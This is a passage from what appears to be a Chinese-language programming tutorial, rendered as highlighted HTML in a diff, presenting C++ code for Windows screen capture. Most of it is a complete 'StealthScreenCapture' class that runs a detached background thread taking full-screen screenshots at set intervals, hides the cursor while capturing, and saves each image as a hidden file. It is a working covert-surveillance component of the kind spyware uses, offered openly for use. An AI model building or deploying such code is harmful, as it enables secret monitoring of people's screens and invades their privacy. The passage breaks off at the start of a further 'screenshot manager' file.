+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">AdvancedScreenCapture</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">InitializeGDIPlus</span><span style="color:#E1E4E8">()) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to initialize GDI+</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 截取屏幕保存为PNG</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">AdvancedScreenCapture</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">CaptureScreenToPNG</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"advanced_screenshot.png"</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Screen captured to PNG</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 截取活动窗口保存为JPEG</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">AdvancedScreenCapture</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">CaptureActiveWindow</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"active_window.jpg"</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Active window captured to JPEG</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 清理GDI+</span></span>
+<span class="line"><span style="color:#B392F0">    AdvancedScreenCapture</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">ShutdownGDIPlus</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><h3 id="section-10">3. 隐蔽屏幕截图实现</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// stealth_screen_capture.cpp</span></span>
+<span class="line"><span style="color:#6A737D">// 隐蔽屏幕截图实现</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;string></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;vector></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;thread></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;chrono></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 隐蔽屏幕截图类</span></span>
+<span class="line"><span style="color:#F97583">class</span><span style="color:#B392F0"> StealthScreenCapture</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">private:</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#E1E4E8"> m_enabled;</span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::string m_outputDir;</span></span>
+<span class="line"><span style="color:#F97583">    int</span><span style="color:#E1E4E8"> m_interval;</span><span style="color:#6A737D"> // 截图间隔（秒）</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">public:</span></span>
+<span class="line"><span style="color:#B392F0">    StealthScreenCapture</span><span style="color:#E1E4E8">() : </span><span style="color:#B392F0">m_enabled</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">false</span><span style="color:#E1E4E8">), </span><span style="color:#B392F0">m_interval</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">30</span><span style="color:#E1E4E8">) {}</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 设置输出目录</span></span>
+<span class="line"><span style="color:#F97583">    void</span><span style="color:#B392F0"> SetOutputDirectory</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> dir</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        m_outputDir </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> dir;</span></span>
+<span class="line"><span style="color:#B392F0">        CreateDirectoryA</span><span style="color:#E1E4E8">(dir, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 设置截图间隔</span></span>
+<span class="line"><span style="color:#F97583">    void</span><span style="color:#B392F0"> SetInterval</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">int</span><span style="color:#FFAB70"> seconds</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        m_interval </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> seconds;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 启动隐蔽截图</span></span>
+<span class="line"><span style="color:#F97583">    void</span><span style="color:#B392F0"> Start</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (m_enabled) </span><span style="color:#F97583">return</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        m_enabled </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Stealth screen capture started</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 启动截图线程</span></span>
+<span class="line"><span style="color:#B392F0">        std</span><span style="color:#E1E4E8">::thread </span><span style="color:#B392F0">captureThread</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#B392F0">StealthScreenCapture</span><span style="color:#E1E4E8">::CaptureThread, </span><span style="color:#79B8FF">this</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        captureThread.</span><span style="color:#B392F0">detach</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 停止隐蔽截图</span></span>
+<span class="line"><span style="color:#F97583">    void</span><span style="color:#B392F0"> Stop</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#E1E4E8">        m_enabled </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Stealth screen capture stopped</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 检查是否启用</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> IsEnabled</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">const</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> m_enabled;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">private:</span></span>
+<span class="line"><span style="color:#6A737D">    // 截图线程</span></span>
+<span class="line"><span style="color:#F97583">    void</span><span style="color:#B392F0"> CaptureThread</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> counter </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        while</span><span style="color:#E1E4E8"> (m_enabled) {</span></span>
+<span class="line"><span style="color:#6A737D">            // 生成文件名</span></span>
+<span class="line"><span style="color:#F97583">            char</span><span style="color:#E1E4E8"> filename[MAX_PATH];</span></span>
+<span class="line"><span style="color:#B392F0">            sprintf_s</span><span style="color:#E1E4E8">(filename, </span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%s\\</span><span style="color:#9ECBFF">capture_</span><span style="color:#79B8FF">%04d</span><span style="color:#9ECBFF">.bmp"</span><span style="color:#E1E4E8">, m_outputDir.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(), counter</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#6A737D">            // 截图</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">CaptureSilent</span><span style="color:#E1E4E8">(filename)) {</span></span>
+<span class="line"><span style="color:#B392F0">                printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Screenshot saved: </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#6A737D">            // 等待下一次截图</span></span>
+<span class="line"><span style="color:#F97583">            for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> m_interval </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#E1E4E8"> m_enabled; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">                std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">this_thread</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">sleep_for</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">chrono</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">seconds</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">));</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 隐蔽截图（无提示）</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> CaptureSilent</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 隐藏光标</span></span>
+<span class="line"><span style="color:#B392F0">        ShowCursor</span><span style="color:#E1E4E8">(FALSE);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 获取屏幕尺寸</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> screenWidth </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetSystemMetrics</span><span style="color:#E1E4E8">(SM_CXSCREEN);</span></span>
+<span class="line"><span style="color:#F97583">        int</span><span style="color:#E1E4E8"> screenHeight </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetSystemMetrics</span><span style="color:#E1E4E8">(SM_CYSCREEN);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 获取屏幕DC</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hScreenDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hScreenDC) {</span></span>
+<span class="line"><span style="color:#B392F0">            ShowCursor</span><span style="color:#E1E4E8">(TRUE);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建内存DC</span></span>
+<span class="line"><span style="color:#E1E4E8">        HDC hMemoryDC </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleDC</span><span style="color:#E1E4E8">(hScreenDC);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hMemoryDC) {</span></span>
+<span class="line"><span style="color:#B392F0">            ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#B392F0">            ShowCursor</span><span style="color:#E1E4E8">(TRUE);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建位图</span></span>
+<span class="line"><span style="color:#E1E4E8">        HBITMAP hBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateCompatibleBitmap</span><span style="color:#E1E4E8">(hScreenDC, screenWidth, screenHeight);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hBitmap) {</span></span>
+<span class="line"><span style="color:#B392F0">            DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">            ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#B392F0">            ShowCursor</span><span style="color:#E1E4E8">(TRUE);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 选择位图</span></span>
+<span class="line"><span style="color:#E1E4E8">        HGDIOBJ hOldBitmap </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hBitmap);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 复制屏幕内容</span></span>
+<span class="line"><span style="color:#E1E4E8">        BOOL result </span><span style="color:#F97583">=</span><span style="color:#B392F0"> BitBlt</span><span style="color:#E1E4E8">(hMemoryDC, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, screenWidth, screenHeight,</span></span>
+<span class="line"><span style="color:#E1E4E8">                            hScreenDC, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, SRCCOPY);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 恢复光标</span></span>
+<span class="line"><span style="color:#B392F0">        ShowCursor</span><span style="color:#E1E4E8">(TRUE);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (result) {</span></span>
+<span class="line"><span style="color:#6A737D">            // 保存位图</span></span>
+<span class="line"><span style="color:#E1E4E8">            result </span><span style="color:#F97583">=</span><span style="color:#B392F0"> SaveBitmapToFile</span><span style="color:#E1E4E8">(hBitmap, hMemoryDC, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 清理资源</span></span>
+<span class="line"><span style="color:#B392F0">        SelectObject</span><span style="color:#E1E4E8">(hMemoryDC, hOldBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteObject</span><span style="color:#E1E4E8">(hBitmap);</span></span>
+<span class="line"><span style="color:#B392F0">        DeleteDC</span><span style="color:#E1E4E8">(hMemoryDC);</span></span>
+<span class="line"><span style="color:#B392F0">        ReleaseDC</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hScreenDC);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> (result </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> FALSE);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 保存位图文件（静默）</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> SaveBitmapToFile</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">HBITMAP</span><span style="color:#FFAB70"> hBitmap</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">HDC</span><span style="color:#FFAB70"> hDC</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        BITMAP bmp;</span></span>
+<span class="line"><span style="color:#B392F0">        GetObject</span><span style="color:#E1E4E8">(hBitmap, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(BITMAP), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bmp);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        BITMAPINFOHEADER bi </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biSize </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPINFOHEADER);</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biWidth </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> bmp.bmWidth;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biHeight </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> bmp.bmHeight;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biPlanes </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biBitCount </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 24</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biCompression </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> BI_RGB;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD dwBmpSize </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ((bmp.bmWidth </span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> bi.biBitCount </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 31</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">/</span><span style="color:#79B8FF"> 32</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">*</span><span style="color:#79B8FF"> 4</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> bmp.bmHeight;</span></span>
+<span class="line"><span style="color:#B392F0">        std</span><span style="color:#E1E4E8">::vector</span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">BYTE</span><span style="color:#F97583">></span><span style="color:#B392F0"> bmpData</span><span style="color:#E1E4E8">(dwBmpSize);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">GetDIBits</span><span style="color:#E1E4E8">(hDC, hBitmap, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, bmp.bmHeight, </span></span>
+<span class="line"><span style="color:#E1E4E8">                      bmpData.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">(), (BITMAPINFO</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bi, DIB_RGB_COLORS)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建隐藏文件</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hFile </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateFileA</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">            filename,</span></span>
+<span class="line"><span style="color:#E1E4E8">            GENERIC_WRITE,</span></span>
+<span class="line"><span style="color:#79B8FF">            0</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">            CREATE_ALWAYS,</span></span>
+<span class="line"><span style="color:#E1E4E8">            FILE_ATTRIBUTE_HIDDEN,</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span></span>
+<span class="line"><span style="color:#E1E4E8">        );</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (hFile </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        BITMAPFILEHEADER_COMPAT bmfHeader </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmfHeader.bfType </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">4D42</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmfHeader.bfSize </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPFILEHEADER_COMPAT) </span><span style="color:#F97583">+</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPINFOHEADER) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> dwBmpSize;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmfHeader.bfOffBits </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPFILEHEADER_COMPAT) </span><span style="color:#F97583">+</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPINFOHEADER);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD written;</span></span>
+<span class="line"><span style="color:#B392F0">        WriteFile</span><span style="color:#E1E4E8">(hFile, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bmfHeader, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(BITMAPFILEHEADER_COMPAT), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">written, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        WriteFile</span><span style="color:#E1E4E8">(hFile, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bi, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(BITMAPINFOHEADER), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">written, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        WriteFile</span><span style="color:#E1E4E8">(hFile, bmpData.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">(), dwBmpSize, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">written, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hFile);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 测试隐蔽截图</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> TestStealthCapture</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"=== Stealth Screen Capture Test ===</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    StealthScreenCapture capture;</span></span>
+<span class="line"><span style="color:#E1E4E8">    capture.</span><span style="color:#B392F0">SetOutputDirectory</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"captures"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    capture.</span><span style="color:#B392F0">SetInterval</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">);</span><span style="color:#6A737D"> // 10秒间隔</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    capture.</span><span style="color:#B392F0">Start</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Stealth capture running for 60 seconds...</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    Sleep</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">60000</span><span style="color:#E1E4E8">);</span><span style="color:#6A737D"> // 运行1分钟</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    capture.</span><span style="color:#B392F0">Stop</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Stealth capture test completed</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><h3 id="section-11">4. 屏幕截图管理器</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// screenshot_manager.cpp</span></span>
+<span class="line"><span style="color:#6A737D">// 屏幕截图管理器</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;string></span></span>
